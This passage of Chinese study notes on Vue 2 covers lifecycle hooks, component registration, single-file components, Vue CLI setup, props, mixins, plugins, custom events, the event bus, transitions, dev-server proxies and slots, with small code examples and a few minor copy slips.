`change` 方法改变了 `data` 中的属性 `opacity`，页面会被重新解析，每次解析，又会调用 `change`，会同时开启大量定时器。
想要一打开页面，元素的透明度正常变化，需要使用 `mounted`。

```js
//...
mounted() {
    setTimeout(() => {
        this.opacity -= 0.01;
        if (this.opacity <= 0) this.opacity = 1
    }, 16);
},
//...
```

<Image src="https://v2.cn.vuejs.org/images/lifecycle.png">生命周期示意图</Image>

### 挂载

1. 初始化：生命周期、事件，但是数据代理还未开始。 => `beforeCreate` ：此时：无法通过 vm 访问到 data 中的数据、methods 中的方法。
2. 初始化：数据监测、数据代理。=> `created`：此时：可以通过 vm 访问到 data 中的数据、methods 中的方法。
3. `created` ~ `beforeMount` ：此阶段 Vue 开始解析模板，生成虚拟 DOM（内存中），页面还不能显示解析好的内容。
4. `beforeMount`：此时：1.页面呈现的是未经Vue编译的DOM结构；2.所有对DOM的操作，最终都不奏效。
5. `beforeMount` ~ `mounted` ：将内存中的 **虚拟 DOM** 转为 **真实 DOM** 插入页面。
6. `mounted`：此时：1.页面中呈现的是经过 Vue 编译的 DOM；2.对 DOM 的操作均有效（尽可能避免）。

至此，初始化过程结束，一般在此进行：开启定时器、发送网络请求、订阅消息、绑定自定义事件等初始化操作。

### 更新流程

1. `beforeUpdate`：此时，数据是新的，但是页面未更新。即：**页面尚未和数据保持同步**。
2. `beforeUpdate` ~ `updated`：根据新数据，生成新的虚拟 DOM ，随后与旧的虚拟 DOM 进行比较，最终完成页面更新，即：完成了 Model => View 的更新。（数据 => 视图）
3. `updated`：数据和页面，都是最新的。即：**页面和数据保持同步**。

### 销毁

**vm.$destroy()**：完全销毁一个实例。清理它与其他实例的连接，解绑它的**全部指令**及**所有事件监听器**。

1. `beforeDestroy`：此时：vm 中所有的：data、methods、指令等，都处于**可用的状态**，马上要指向销毁过程，一般在此阶段：关闭定时器、取消订阅消息、解绑自定义事件等**收尾操作**。
2. `destroyed`

注意：

- vm 被销毁后，页面保持销毁前的状态
- `beforeDestroy` 以及 `destroyed` 中，改变 data 中的数据，调用 methods 中的方法，不会触发页面的更新，也不会触发 watch。

### 生命周期总结

1. 停止标题透明度变换：销毁定时器、销毁 vm：

```html
<h2 :style="{opacity}">欢迎学习 Vue</h2>
<button @click="opacity = 1">透明度设置为1</button>
<button @click="stop">点我停止变换</button>
```

```js
new Vue({
    el: '#root',
    data: {
        opacity: 1,
    },
    methods: {
        stop() {
            //clearInterval(this.timer); //不推荐
            this.$destroy();
        }
    },
    mounted() {
        this.timer = setInterval(() => {
            console.log('setInterval');
            this.opacity -= 0.01;
            if (this.opacity <= 0) this.opacity = 1;
        }, 15);
    },
    beforeDestroy() {
        clearInterval(this.timer);
    },
})
```

一般来说，在销毁 vm 时，销毁定时器这类行为，在 `beforeDestroy` 中进行。如上，不在方法 stop 中去清除定时器，因为可能不是 stop 触发的
 vm 销毁。

2. 总结：

- 目前钩子总结，4对：
  - beforeCreate ~ created => 数据代理
  - <mark>beforeMount ~ mounted => 页面挂载</mark>，常用：初始化操作
  - beforeUpdate ~ updated => 更新数据
  - <mark>beforeDestroy ~ destroyed => 销毁 vm</mark>，常用：收尾工作
- 一般不会在 `beforeDestroy` 中操作数据，即便操作了，也<mark>不会触发更新流程</mark>。


# Vue 组件化编程

> 实现应用中**局部**功能**代码**和**资源的集合**

## 模块与组件、模块化与组件化

## 非单文件组件

### 基本使用

1. `Vue.extend` 创建组件

```js
const student = Vue.extend({
    template: `
        <div>
            <h2>姓名：{{name}}</h2>
            <h2>年龄：{{age}}</h2>
        </div>
    `,
    data() {
        return {
            name: '张三',
            age: 18
        }
    }
})

const school = Vue.extend({
    template: `
        <div>
            <h2>学校：{{name}}</h2>
            <h2>地址：{{location}}</h2>
        </div>
    `,
    data() {
        return {
            name: '理工大学',
            location: 'Chengdu'
        }
    }
})
```

注意：
- `data` 要写成函数式，这样多个地方调用相同组件才**互不影响**。
- 注册组件的时候，不用配置 `el`

2. 注册组件

- **局部注册**

```js
new Vue({
    el: '#root',
    data:{
        msg:'hello!'
    },
    components: {
        student,//student:student,
        school//school:school
    }
})
```

components 属性名可以和组件名不一样，但是一般来说，两者名称设置相同，可简写。

3. 编写组件标签，页面引入组件：

```html
<div id="root">
    {{msg}}
    <hr>
    <student></student>
    <hr>
    <school></school>
</div>
```

**补充：全局注册组件**

```js
const hello = Vue.extend({
    template: `
        <div>
            <h2>你好呀！{{name}}</h2>
        </div>
    `,
    data() {
        return {
            name: '美女',
        }
    }
})
Vue.component('hello',hello)
```

```html
<div id="root1">
    <hello></hello>
</div>
<div id="root2">
    <hello></hello>
</div>
```

组件的简写，省略 `Vue.extend`，可以直接使用对象：

```js
const hello = {
    data() {
        return {
            name: '美女',
        }
    }
}
```

在注册组件的时候，如果传入的是 Object，Vue 会自动调用 `Vue.extend`。

### 组件名称

1. 一个单词，首字母大写，与 Vue 开发者工具命名相同

```html
<body>
    <div id="root">
        <School></School>
    </div>
</body>
<script>
    Vue.config.productionTip = false

    const s = Vue.extend({
        template: ``,
        data() {
            return {
            }
        }
    })

    new Vue({
        el:"#root",
        components:{
            'my-school':s
        }
    })
</script>
```

2. 多个单词

连接符：

```js
new Vue({
    el:"#root",
    components:{
        'my-school':s
    }
})
```
或者首字母大写，但是注意，这种写法只有在使用 Vue-cli 搭建项目时使用才正常。

```js
new Vue({
    el:"#root",
    components:{
        MySchool:s
    }
})
```

注意：组件名应避免与 HTML 已有的标签重名，如 h2 。

3. 开发者工具中组件的名称

可以使用 name 配置项指定组件在开发者工具中呈现的名字。


创建组件 s 时，配置了 name 属性值为 `student-comp`，Vue 开发者工具显示的名称是 `StudentComp`，不配置，默认显示注册组件时的名称，即 `School`。

```html
<script>
    const s = Vue.extend({
        name:'student-comp',
    })

    new Vue({
        el:"#root",
        components:{
            School:s
        }
    })
</script>
<body>
    <div id="root">
        <School></School>
    </div>
</body>

```

### 组件使用

```html
<div id="root">
    <School></School>
    <!-- 注意，自闭和写法只有在脚手架中使用 -->
    <School/>
</div>
```

### 组件嵌套

1. 实例：组件嵌套逻辑：Root => School => Student。

`student` 组件要创建后，才能在 `school` 中注册，要注意代码执行的顺序。

```html
<body>
    <div id="root">
        <school></school>
    </div>
</body>
<script>
    Vue.config.productionTip = false;

    const student = Vue.extend({
        template: `
        <div>
            <h2>姓名：{{name}}</h2>
            <h2>年龄：{{age}}</h2>
        </div>
    `,
        data() {
            return {
                name: '张三',
                age: 18
            }
        }
    })

    const school = Vue.extend({
        // 在 template 中使用子组件
        template: `
        <div>
            <h2>学校：{{name}}</h2>
            <h2>地址：{{location}}</h2>
            <student></student>
        </div>
    `,
        data() {
            return {
                name: '理工大学',
                location: 'Chengdu'
            }
        },
        components: {
            student
        }
    })

    new Vue({
        el:"#root",
        components:{
            school
        }
    })
</script>
```

2. 使用 app 组件管理所有组件

实际开发中，app 组件只被 Root 所管理，并管理所有其他组件。

```html
<div id="root"></div>
```

```js
// student 是 school 的子组件
const student = Vue.extend({
})

const school = Vue.extend({
    template: `
    <div>
        <student></student>
    </div>`,
    components: {
        student
    }
})

const hello = Vue.extend({
})

// student、hello 是 app 的子组件
const app = Vue.extend({
    template: `
    <div>
        <student></student>
        <hello></hello>
    </div>`,
    components: {
        student,
        hello
    }
})

new Vue({
    template:'<app></app>',
    el:"#root",
    components:{app}
})
```

### 组件本质 - VueComponet

1. 组件的本质是构造函数 **VueComponent**，由 `Vue.extend` 生成。
2. 当组件被引入页面时，Vue 在此时创建组件的实例对象，即执行：`new VueComponent(options)`
3. 每次调用 `Vue.extend`，返回的都是一个全新的 `VueComponent`：
   - 同一个组件，在页面引入多次，每次返回的都是一个全新的 `VueComponent`
   - 不同组件，但是配置项 `options` 都相同，所返回的 `VueComponent` 也是不一样的
4. 关于 `this` 指向：组件配置中，data、methods、computed等配置项中的普通函数，它们的 `this` 均是 `VueComponent` 实例对象**（vc）**，与 vm （ `Vue` 的实例对象） 结构类似。

### Vue 实例与组件实例对象的关系（vm 与 vc）

`VueComponent.prototype.__proto__ === Vue.prototype`，如此，组件实例对象 vc 可以访问到 Vue 原型上的属性、方法。

<Image src="https://forting.nooooe.cn/20230212112531.png">vc 与 vm 原型链关系</Image>

因为组件是可复用的 Vue 实例，所以它们与 new Vue 接收相同的选项，例如 data、computed、watch、methods 以及生命周期钩子等。仅有的**例外**是像 el 这样根实例**特有的选项**。

以构造函数出发：

```js
function Demo() {
    this.a = 1
    this.b = 2
}
const d = new Demo();
```

`Demo.prototype` => 显示原型属性，`d.__proto__` => 隐式原型属性，都指向同一个原型对象。

```js
Demo.prototype.x = 99
```

通过显示原型属性操作原型对象，追加一个属性值为 99 的 x 属性，能通过其**实例对象**的属性访问到：`d.x` 或者 `d.__proto__.x`。

## 单文件组件 *.vue

结构：
- `<template></template>` => html
- `<script></script>` => js
- `<style></style>` => css

### 组件的基本使用逻辑

1. 创建子组件 `School`、`Student`

`School.vue`：

```vue
<template>
    <div class="demo">
        <h2>{{name}}</h2>
        <h2>{{location}}</h2>
        <button @click="showName">点我提示学校名</button>
    </div>
</template>

<script>
export default {
    name: 'School',
    data() { 
        return {
            name:'理工大学',
            location:'成都'
        }
    },
    methods: {
        showName(){
            alert(this.name)
        }
    },
}
</script>

<style>
.demo {
    background-color: orange;
}
</style>
```

`Student.vue`：

```vue
<template>
    <div>
        <h2>{{name}}</h2>
        <h2>{{age}}</h2>
    </div>
</template>

<script>
export default {
    name: 'Student',
    data() { 
        return {
            name:'张三',
            age:18
        }
    },
}
</script>
```

2. 创建 `App` 组件

```vue
<template>
    <div>
        <School/>
        <Student/>
    </div>
</template>

<script>
// 引入组件
import School from "./School.vue";
import Student from "./Student.vue";

export default {
  name: "App",
  components: {
    School,
    Student
  }
};
</script>

<style>
</style>
```

3. main.js 页面引入 App

```js
// main.js
import App from './App'

new Vue({
    template:'<App></App>',
    name:'App',
    components:{App}
})
```

4. index.html 页面引入 main.js

```html
<!-- index.html 入口文件 -->
<body>
    <div id="root"></div><!-- App.vue 中使用了 #toot 节点，要保证页面渲染完成再创建 Vue 实例 -->
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js"></script>
    <script src="./main.js"></script> <!-- index.js 创建 Vue 实例，所以 Vue 要在此之前引入-->
</body>
```

### 初始化 Vue-cli

> CLI：Command Line Interface

初始化脚手架：

1. 全局安装 `@vue/cli`，仅第一次执行：`npm install -g @vue/cli`

如果出现下载缓慢，配置 npm 淘宝镜像：`npm config set registry https://registry.npm.taobao.org`

2. 使用 `vue create xxx` 创建项目在当前路径
3. 启动项目：`npm run serve`

### Vue-cli 结构

#### 配置文件

- .gitignore => git 提交代码时忽略的文件
- babel.config.js => babel 的控制文件，用于将 ES6 转 ES5，**可参考babel官网，进行更详细的配置**
- package.json => 说明文件，引用包的信息，以及相关依赖

```json
"scripts": {
"serve": "vue-cli-service serve",
"build": "vue-cli-service build",// 工程结束后编译
"lint": "vue-cli-service lint" // js 语法检查，*.vue、*.js 文件，一般不用
},
```

- package-lock.json => 包版本控制文件，固定下载包的版本号
- src/assets => 放置静态资源，网页所需的图片、视频
- src/components => 除了 App.vue 外的所有子组件

#### 运行逻辑

1. `npm run serve` => 执行 'src/main.js' 文件

该文件，是整个项目的入口文件

```js
// main.js
// 引入 Vue
import { createApp } from 'vue'
// 引入 App
import App from './App.vue'
// 创建 Vue 实例对象，并放入 #app 容器中
createApp(App).mount('#app')
```

2. 运行 `App.vue`

```vue
<template>
    <div>
      <img src="./assets/logo.png" alt=""><!-- 引入外部图片 -->
        <School/>
        <Student/>
    </div>
</template>

<script>
// 引入组件
import School from "./components/School.vue";
import Student from "./components/Student.vue";

export default {
  name: "App",
  components: {
    School,
    Student
  }
};
</script>
```

3. public/index.html => 根页面

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <!-- 针对 IE 浏览器的特殊配置，让 IE 浏览器以最高的渲染级别渲染页面 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- 开启移动端的理想视口 -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <!-- 配置页签图标 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
    <!-- 使用 webpack 配置网页标题，依赖 package.json 中 name 配置项 -->
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
    <!-- 当浏览器不支持 js 时，noscript 中的元素会被渲染 -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>
```

`<%= BASE_URL %>favicon.ico` 路径等价于 `./favicon.ico`，但为了避免部署到服务器后出现各种路径问题，使用 `<%= BASE_URL %>`，表示根目录的 public 文件夹。

### render 函数

Vue2 中，入口文件 src/main.js 中 `import Vue from 'vue'` 引入的 `vue` 是不完整的，缺少模板解析器，不能直接放置 `template` 配置，以下写法报错：

```js
import Vue from 'vue' //引入 node_modules/vue.runtime.esm.js，无模板解析器

new Vue({
    el:"#app",
    template:`<h1>你好</h1>`
})
```
vue.runtime.esm.js 配合 render 函数可正常显示：

```js
import Vue from 'vue' //引入 node_modules/vue.runtime.esm.js，无模板解析器

new Vue({
    el:"#app",
    render(createElement){
        return createElement('h1','Hello')//参数：标签名，标签内的value值
    }
})
```

```js
render:createElement => createElement('h1','Hello')//简写
render:h => h(App) // 解析 App 结构，放入页面
```

引入完整版则正常：

```js
import Vue from 'vue/dist/vue.js'

new Vue({
    el:"#app",
    template:`<h1>你好</h1>`
})
```

补充：Vue 的核心包括，**模板解析器**和**生命周期函数**，将 vue 的功能拆开，使用精简版 Vue ，便于编译打包，节省体积。模板解析器不需要打包。

- 带有 `vue.runtime` 的文件表示运行时 Vue ，不带有模板解析器。
- vue.runtime.esm.js，esm 表示 ES Module，使用模块化语法时使用此版本。


<mark>vue.js 与 vue.runtime.xxx.js 区别：</mark>：

 1. vue.js 是完整版 Vue，包含：核心功能 + 模板解析器
 2. vue.runtime.xxx.js 是运行版 Vue ，只包含：核心功能，没有模板解析器，不能使用 `template` 配置项，需要使用 `render` 函数接收到的 `createElement` 函数去指定具体内容。

### 修改默认配置

> 能修改的配置，参考官网 [Vue-cli 配置参考](https://cli.vuejs.org/zh/config/#vue-config-js)

使用 vue.config.js 文件进行配置，将 webpack 默认配置替换掉，如自定义入口文件为 `main2.js`，`index2.html`：

```js
module.exports = {// 使用 CommonJS 模块化语法。配合 webpack 和 Node 打包使用
  pages: {
    index: {
      entry: 'src/main2.js',
      template: 'public/index2.html',
    },
  }
}
```

关闭语法检查：

```js
module.exports = {
    lintOnSave:false
}
```

<mark>总结：</mark>

1. 使用 `vue inspect > output.js` 可以查看到 Vue-Cli 的默认配置
2. 使用 vue.config.js 可以对 Vue-Cli 进行个性化定制，详见[Vue-cli 配置参考](https://cli.vuejs.org/zh/config/#vue-config-js)

### ref 属性

- 类似 HTML 页面标签的 id 属性，用于给元素或者**子组件**注册引用信息
- 应用在 HTML 标签上获取的是真实 DOM 元素，应用在组件标签上是组件实例对象（VueComponent）
- 获取方式：`this.$refs.xxx`，实例：

```vue
<template>
    <div>
      <h1 v-text="msg" ref="text"></h1><!--元素-->
      <button ref="btn">按钮</button>
      <School ref="school"/><!--子组件-->
    </div>
</template>

<script>
// 引入组件
import School from "./components/School.vue";

export default {
  name: "App",
  data() {
    return {
      msg:'hello Vue!'
    }
  },
  components: {
    School,
  },
  methods: {
    shwoElement(){
      console.log(this.$refs.text);//真实 DOM 元素
      console.log(this.$refs.btn);//真实 DOM 元素
      console.log(this.$refs.school);//School 组件实例对象？Vue2：VueComponent；Vue3:Proxy
    }
  },
};
</script>
```

### props 配置

功能：让组件接收外部传过来的数据，提高复用组件频率

#### 传递数据

如下，name、sex、age 是外部传进的数据：

```vue
<template>
  <div>
    <School name="张三" sex="男" age="18"/>
    <School name="李四" sex="男"/>
  </div>
</template>
```

#### 接收数据

1. 直接接收：`props:["name","sex","age"]`
2. 限制类型：

```js
//...
props:{
    name:String,
    age:Number,//限制传入的数据是数字
    sex:String
}
//...
```

`<School name="张三" sex="男" age="18"/>` 传入的 `age` 是字符串。


`<School name="张三" sex="男" :age="18"/>` 传入的 `age` 是数字，v-bind 命令将引号内的内容当做 js 解析。

3. 限制类型(`type`)、限制必要性(`required`)、指定默认值(`default`)（最完整的写法）：

```js
//...
props:{
    name:{
        type:String,
        required:true // name 是必要属性
    },
    age:{
        type:Number,
        default:21 // 默认值
    },
    sex:{
        type:String,
        required:true
    }
}
//...
```

注意：`props` 是只读的，Vue 底层会监测 `props` 的修改，如果进行了修改，就会发出警告，如果业务需求确实需要修改，需要复制 `props` 的内容到 `data` 中去，然后去修改 `data` 中的数据：


```vue
<template>
  <div>
    <h2>{{myAge}}</h2>
    <button @click="addAge">点我年龄 + 1</button>
  </div>
</template>

<script>
export default {
  name: "my-school",
  data() {
    return {
      myAge: this.age
    };
  },
  methods: {
    addAge() {
      this.myAge++;// 而不是 this.age ++
    }
  },
  props: ["name", "sex", "age"]
};
</script>
```

当 `data` 和 `props` 配置冲突时，`props` 优先。

### mixin 混入（src/mixin.js）

多个组件共用的配置提取成一个混入的对象。

- 局部混合：`mixins:['xxx']`

在子组件中引入，如 `School.vue` 和 `Student.vue` 组件共用 `data`、`mounted`、`methods` 等配置：

```vue
<!--School.vue 与 Student.vue 类似-->
<template>
  <div>
    <h2>{{name}}</h2>
    <h2>{{ x }}</h2><!--100-->
    <h2>{{ y }}</h2><!--888-->
    <button @click="showName">显示学校名字</button>
  </div>
</template>

<script>
import { mininTest } from "../mixin";

export default {
  name: "my-school",
  data() {
    return {
      x: 100,
      name: "成都理工"
    };
  },
  mixins: [mininTest]
};
</script>
```

定义混合：

```js
//minin.js
export const mininTest = {
    data(){
        return {
            x:666,
            y:888
        }
    },
    methods: {
        showName(){
            alert(this.name)
        }
    },
    mounted() {
        
    },
}
```

minin.js 中，`data` 配置项会和 vc 原本配置混合，当数据冲突时，以 vc 为准。而生命周期钩子，都会被替换掉，以 minin.js 为准。

- 全局混合：`Vue.mixin(xxx)`

在 main.js 中引入，vm 以及所有的 vc 都有混合配置项。

```js
//main.js
import { mininTest } from "./mixin";
Vue.mixin(mininTest)
```

### 插件（src/plugin.js）

用于增强 Vue ，包含 install 方法的一个对象，install 第一个参数是 `Vue`，第二个及以后的参数是插件使用者传递的数据。

定义插件：

```js
export default {
    install(){
        // 插件执行代码
    }
}
```

使用插件：

```js
// src/main.js
// 引入插件
import plugins from './plugins'
// 使用插件
Vue.use(plugins,1,2,3);
```

插件接收的参数是 Vue 构造函数，可以将**全局过滤器、全局指令、混入**定义在这个文件，便于管理。

```js
export default {
    install(Vue){
        // 全局过滤器
        Vue.filter('myFilter',function (value) {
            // ...
        })
        // 全局指令
        Vue.directive('fbind',{
            // ...
        })
        // 定义混入
        Vue.mixin({
            // ...
        })
        // 在 Vue 原型上添加一个方法（vm、vc 都可使用）
        Vue.prototype.hello = () => {alert('Hello!Younth.')}
    }
}
```

### scoped 样式

让样式在局部生效，防止冲突。

```vue
/* Student.vue */
// 只对局部组件有效
<style scoped>
.title {
  color: blue;
}

</style>
// 只能写 less 样式
<style lang="less">
</style>
```

一般，公共样式另起 `src/main.css`，然后在 `src/main.js` 引入

```js
// main.js
import './main.css'
```

## 组件化编码流程

## Todo 案例（初始版）

1. 组件化编码流程：
   - 拆分静态组件：组件要按照**功能点**拆分，命名不要与 HTML 元素冲突。
   - 实现动态组件：考虑好数据的存放位置，是否是多个组件使用？（读数据，展示数据，更新数据）
      - 一个组件在使用：放在自身即可
      - 一些组件在用：放在共同的父组件上（状态提升）
   - 实现交互：从绑定事件开始
2. props 适用于：
   - 父组件 => 子组件 通信
   - 子组件 => 父组件 通信（要求父先给子一个函数）
3. 使用 v-model 要切记：v-model 绑定的值不能是 props 传过来的值，因为 props 是不可以修改的！
4. props 传过来的若是对象类型的值，修改对象中的属性时 Vue 不会报错，要避免这样做。


uuid ？nanoid ？

计算属性可以互相引用。

要修改计算属性，不能使用简写形式，要定义 setter。

## 浏览器本地存储 webStorage

localStorage 浏览器关闭不会清空，sessionStorage 关闭浏览器后数据被清空。

1. 存

```js
localStorage.setItem('name','张三');
sessionStorage.setItem('name','张三');
```

key、value 以键值对的形式存在本地，都是**字符串**。

如果 value 不是字符串，会调用方法 `toString()` 转换为字符串。若是对象，不能使用默认的 `toString()` 方法，要使用 `JSON.stringfy()`。

2. 读取

```js
localStorage.getItem('name');
sessionStorage.setItem('name','张三');
```

3. 删除

删除单个：

```js
localStorage.removeItem('name');
sessionStorage.setItem('name','张三');
```

清空所有：

```js
localStorage.clear();
sessionStorage.setItem('name','张三');
```

#@ 组件自定义事件

## 绑定自定义事件

以下是基于 Vue2 练习的，Vue3 中没有 `this.$refs.xxx.$on`。

将子组件 `School.vue` 的参数传递给父组件 `App.vue`，App 中先设置接收参数的方法：

```js
//...
methods: {
getSchoolName(value,...params){
    console.log("App 接受到了数据：", value,params);
},
},
//...
```

在模板中，将方法传递给 School：

1. `v-bind` ，子组件使用 `props` 接收函数

```vue
<template>
<!-- App.vue -->
<School :getName="getSchoolName"/>
</template>
```

```js
// School.vue
//...
props:["getName"],
methods:{
sendName(){//
    this.getName(this.name)
}
}
//...
```

2. `v-on`，子组件使用 `this.$emit` 绑定自定义事件

```vue
<template>
<!-- App.vue -->
<School @getName="getSchoolName"/>
</template>
```

```js
// School.vue
//...
methods:{
sendName(){
    this.$emit('getName',this.name,1,2,3)
}
}
//...
```

3. 使用 `ref` 

```vue
<template>
<!-- App.vue -->
<School ref="school"/>
</template>

<script>
// ... 在 School 组件上绑定 getSchoolName 函数，命名为 getName
mounted(){
    console.log(this.$refs.school);
    // this.$refs.home 拿到 Home 组件实例对象，仅 Vue2
    this.$refs.school.$on('getName',this.getSchoolName);
    this.$refs.school.$on('getName',function(value,...params){
        // this 的指向是 School 组件
    });
        this.$refs.school.$on('getName',(value,...params) => {
        // this 的指向是 App 组件
    });
}
//...
</script>
```

注意如果，绑定 `getName` 时，直接传入函数，this 的指向是 School 组件。


```js
// School.vue 在子组件中触发 getName 函数
//... 
methods:{
    sendData(){
        this.$emit('getName',this.loacation,1,2,3)
    }
}
//...
```

## 解绑自定义事件

```js
//...
methods:{
    unbind(){
        this.$off('get-name');//解绑指定事件 `get-name`：
        this.$off(['get-name','get-age']);//解绑多个自定义事件
        this.$off();//解绑所有自定义事件
    }
}
//...
```

## 组件绑定原生 DOM 事件

使用 native 修饰符：

```vue
<template>
<Student @click.native="show" />
</template>
```

## 总结

- 组件自定义事件适用于子组件向父组件传递数据，而父组件向子组件传递事件，一般是 props 。

## 全局事件总线 GlobalEventBus

一种组件之间的通信方式，适用于**任意组件之间的通信。** 一般用于兄弟组件、祖孙组件之间。

1. 安装全局事件总线

```js
// main.js
new Vue({
  render: h => h(App),
  beforeCreate(){
    Vue.prototype.$bus = this//安装全局事件总线，$bus 就是当前应用的 vm
  }
}).$mount("#app");
```

2. 使用事件总线

组件 A 接收数据，`this.$bus.$on`：

```vue
<script>
//...
methods: {
    demo(data) {
        //...
        console.log("接收到了数据：", data);
    },
},
mounted() {
    this.$bus.$on("getName", this.demo);
},
//...
</script>
```

组件 B 提供数据：

```vue
<script>
mounted() {
    this.$bus.$emit("getName", this.name);
},
</script>
```

3. 最好在每个组件销毁前，也就是在 `beforeDestroy` 钩子中，使用 `this.$bus.$off(['demo1','demo2'])` 解绑**当前组件所用到的事件**。而不是 `this.$bus` 上的所有事件。

## 使用第三方库，消息订阅与发布（pubsub）

1. 一种组件之间的通信方式，适用于任意组件间通信。
2. 使用步骤：
   - 安装第三方库，pubsub：`npm i pubsub-js`;
   - 引入：`import pubsub from 'pubsub-js'`;
3. 接收数据：订阅消息，在接收数据的组件 A 挂载完成后：

```vue
<script>
// A.vue
methods(){
    demo(param1,param2){
        //...
    }
},
mounted(){
    this.pId = pubsub.subscribe('get-name',this.demo);
    //或者直接将回调写在 mounted 里面
    this.pId = pubsub.subscribe('get-name',(param1,param2) => {
        // 但是要注意，回调写成箭头函数，this 指向才是 vc
        // param1 是订阅的消息名：get-nam,param2 才是接收到的数据
    })
}
//...
</script>
```

最好在 A 组件销毁前，取消订阅：`pubsub.unsubscribe(pId)`。

4. 提供数据：`pubsub.publish('get-name',params-data)`
 
## $nextTick

1. 语法：`this.$nextTick(callback)`
2. 作用：在下一次 DOM 更新结束后执行指定的回调函数

## 动画过渡

### 动画

```vue
<template>
  <div>
    <button @click="isShow = !isShow">点我切换动画</button>
    <transition name="hello" appear>
    <!-- 或者 -->
    <!-- <transition name="hello" :appear="true"> -->
      <h2 v-show="isShow" class="test">你好！</h2>
    </transition>
  </div>
</template>

<style scoped>
h2 {
  background-color: orange;
}

.hello-enter-active {
  animation: test 0.5s linear;
}
.hello-leave-active {
  animation: test 0.5s linear reverse;
}

@keyframes test {
  from {
    transform: translateX(-100%);
  }
  to {
    transform: translateX(0px);
  }
}
</style>
```

`transition` 的 `appear` 属性控制是否页面初始加载时就显示动画。


`transition` 的 `name` 属性值对应 class 中的类名，动画效果。

### 过渡

```vue
<template>
  <div>
    <button @click="isShow = !isShow">点我切换动画</button>
    <transition name="hello" appear>
      <h2 v-show="isShow">你好！</h2>
    </transition>
  </div>
</template>

<style scoped>
h2 {
  background-color: orange;
}
/* 进入起点、离开终点 */
.hello-enter,
.hello-leave-to {
  transform: translateX(-100%);
}

.hello-enter-active,
.hello-leave-active {
  transition: 0.5s linear;
}
/* 进入终点、离开起点 */
.hello-enter-to,
.hello-leave {
  transform: translateX(0);
}
</style>
```

- 多个元素过渡，`transition-group` ：

```vue
<template>
  <div>
    <button @click="isShow = !isShow">点我切换动画</button>
    <transition-group name="hello" appear>
      <h2 v-show="!isShow" key="1">你好1！</h2>
      <h2 v-show="isShow" key="2">你好2！</h2>
    </transition>
  </div>
</template>
```

注意：每个元素要指定 key 值。

- 可以集成第三方库，如 `animate.css`

# Vue 与 ajax 请求

## 解决 ajax 跨域问题

使用第三方库：`axios`、`fetch`，都遵循同源策略：协议名、主机名、端口号一致，如何解决跨域问题：

1. cors，后端配置，服务器返回数据的时候携带特定响应头，浏览器不再劫持数据
2. jsonp，使用 `script` 标签，将链接放在 `src` 中，需要前后端配合，但是只适用于 get 请求
3. 使用代理服务器：
服务器之间传数据不受同源策略限制，设置代理服务器的协议名、主机名、端口号和浏览器地址一致。

### 方式一 devServer 配置单个代理

如，项目域名是 `http:localhost:8080`，需要跨域访问服务器 `http:localhost:5000/students` 的数据 ，通过 `Vue-cli` 开启代理服务器：

1. 在 `vue.config.js` 中配置 `devServer`：

```js
module.exports = {
  devServer: {
    proxy: 'http://localhost:5000'// 配置地址是需要访问的服务器
  }
}
```

2. 代码中向**代理服务器**发送请求：

```js
axios.get('http:localhost:8080/students').then(
    response => {},
    err => {}
    );
```

但是，请求地址会优先匹配前端资源，**如果请求了前端不存在的资源时，该请求才会转发给服务器**。


vue-cli 创建的项目中，public 文件夹下的东西，是本地服务器能直接访问的，也就是 **8080** 有 public 文件夹下的所有数据，如果访问 public 文件夹下的内容，是不会向 5000 端口请求。


缺点：不能配置多个代理，不能灵活控制是否走代理。

### 方式二 devServer 配置多个代理

```js
// vue.config.js
module.exports = {
  devServer: {
    proxy: {
      '/api': {//以 api 开头的请求路径
        target: 'http://localhost:5000',//代理目标的基础路径
        ws: true,//是否开启 websocket，默认开启，为 true
        changeOrigin: true,//默认为 true
        pathRewrite:{'^/api':''}//避免向服务器请求的地址中携带自定义的前缀
      },
      '/foo': {
        target: '<other_url>',
        pathRewrite:{'^/foo':''}
      }
    }
  }
}
```

向**代理服务器**发送请求：

```js
// 紧跟端口号后配置特有前缀
axios.get('http:localhost:8080/api/students').then(
    response => {},
    err => {}
    );
```

- 如果不配置：`pathRewrite:{'^/api':''}`，向服务器请求的数据是：`http:localhost:5000/api/students`，资源显示不存在
- changeOrigin 为 true 时：服务器收到的请求头中的 host 为：localhost:5000（默认为 true）
- changeOrigin 为 false 时：服务器收到的请求头中的 host 为：localhost:8080


说明：

1. 优点：可以配置多个代理，可以灵活控制请求是否走代理
2. 缺点：配置略微繁琐，请求资源时必须加前缀

## 案例：github 用户搜索

公共样式引入：

1. App.vue 中引入：`import './assets/css/bootstrap.css'`，这种方式，vue 会验证样式的合法性，如果 css 中引入了不存在的字体或其他文件，会报错
2. public 中放入 css 资源，在 `index.html` 主页面使用 `link` 标签引入，这种方式，vue 不会校验


## 常用的 ajax 库

`axios`、`fetch`，或者 `vue-resource`（Vue 中的插件，安装完后出现 `vm.$http`）。

## slot 插槽

作用：父组件向子组件指定位置插入 html 结构

1. 默认插槽，当组件不采用自闭和的方式引用时，组件标签内的内容会替换掉 `slot` 标签所在的位置。

```js
//Catogory.vue
<template>
  <div>
    <h3>{{title}}</h3>
    <slot></slot> //会被替换掉
  </div>
</template>
```

```js
// App.vue
<template>
  <div>
    <Catogory>
      <img src="" alt="">
    </Catogory>
    <Catogory>
      <video controls  src=""></video>
    </Catogory>
  </div>
</template>
```

2. 具名插槽

命名：`<slot name="xxx"></slot>`，使用：`<div slot="footer"></div>`、`<template v-slot:footer></template>`

```js
//Catogory.vue
<template>
  <div>
    <h3>{{title}}</h3>
    <slot name="center"></slot>
    <slot name="footer"></slot>
  </div>
</template>
```

```js
// App.vue
<template>
  <div>
    <Catogory>
      <img slot="center" src="" alt="">
      <div slot="footer">
        <a href="">11</a>
        <a href="">22</a>
      </div>
    </Catogory>
    <Catogory>
      <video slot="center" controls  src=""></video>
      <template v-slot:footer>
        <a href="">11</a>
        <a href="">22</a>
      </template>
    </Catogory>
  </div>
</template>
```

3. 作用域插槽

